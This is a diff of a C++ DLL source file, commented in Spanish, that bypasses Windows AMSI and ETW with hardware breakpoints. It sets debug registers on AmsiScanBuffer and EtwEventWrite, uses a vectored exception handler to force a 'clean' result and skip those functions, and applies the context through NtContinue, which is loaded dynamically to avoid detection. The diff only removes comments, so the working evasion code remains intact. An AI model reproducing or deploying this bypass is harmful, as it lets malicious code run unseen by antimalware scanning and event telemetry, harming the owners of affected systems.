@@ -1,9 +1,7 @@
 // ============================================================
 // amsi_etw_bypass.cpp
 // DLL de bypass de AMSI y ETW mediante hardware breakpoints
-// Técnica: NtContinue (evita ETW-TI SetThreadContext)
-// NtContinue cargado dinámicamente (no aparece en import table)
-// ============================================================
+
 
 #include "pch.h"
 #include <amsi.h>
@@ -25,23 +23,17 @@ static PVOID g_etwEventWriteAddr = nullptr;
 static pNtContinue g_NtContinue = nullptr;
 static pRtlCaptureContext g_RtlCaptureContext = nullptr;
 
-// ============================================================
-// VECTORED EXCEPTION HANDLER (VEH)
-// ============================================================
 LONG WINAPI VEH_Handler(PEXCEPTION_POINTERS ExceptionInfo)
 {
     if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
     {
         PCONTEXT ctx = ExceptionInfo->ContextRecord;
 
-        // RAX = 0 → AMSI_RESULT_CLEAN / STATUS_SUCCESS
         ctx->Rax = 0;
 
-        // Simular RET: saltar a la dirección de retorno en el stack
         ctx->Rip = *(DWORD64*)ctx->Rsp;
         ctx->Rsp += 8;
 
-        // Limpiar Trap Flag
         ctx->EFlags &= ~(1ULL << 16);
 
         return EXCEPTION_CONTINUE_EXECUTION;
@@ -50,9 +42,6 @@ LONG WINAPI VEH_Handler(PEXCEPTION_POINTERS ExceptionInfo)
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
-// ============================================================
-// Cargar funciones de ntdll dinámicamente
-// ============================================================
 BOOL LoadNtdllFunctions()
 {
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
@@ -64,9 +53,6 @@ BOOL LoadNtdllFunctions()
     return (g_NtContinue != nullptr && g_RtlCaptureContext != nullptr);
 }
 
-// ============================================================
-// Configurar hardware breakpoints usando NtContinue
-// ============================================================
 BOOL SetupHardwareBreakpoints()
 {
     if (!LoadNtdllFunctions())
@@ -85,27 +71,27 @@ BOOL SetupHardwareBreakpoints()
 
     if (!g_amsiScanBufferAddr) return FALSE;
 
-    // Registrar VEH
+ 
     g_vehHandle = AddVectoredExceptionHandler(1, VEH_Handler);
     if (!g_vehHandle) return FALSE;
 
-    // Capturar contexto actual
+
     CONTEXT ctx = { 0 };
     g_RtlCaptureContext(&ctx);
 
-    // DR0 = AmsiScanBuffer
+ 
     ctx.Dr0 = (DWORD64)g_amsiScanBufferAddr;
 
-    // DR1 = EtwEventWrite (si existe)
+
     if (g_etwEventWriteAddr)
         ctx.Dr1 = (DWORD64)g_etwEventWriteAddr;
 
-    // Habilitar breakpoints locales
+ 
     ctx.Dr7 |= (1ULL << 0);
     if (g_etwEventWriteAddr)
         ctx.Dr7 |= (1ULL << 2);
 
-    // Tipo "execute" (00) y longitud 1 (00)
+
     ctx.Dr7 &= ~(3ULL << 16);
     ctx.Dr7 &= ~(3ULL << 18);
     ctx.Dr7 &= ~(3ULL << 20);
@@ -113,7 +99,6 @@ BOOL SetupHardwareBreakpoints()
 
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
-    // Aplicar vía NtContinue
     NTSTATUS status = g_NtContinue(&ctx, FALSE);
     return (status == 0);
 }
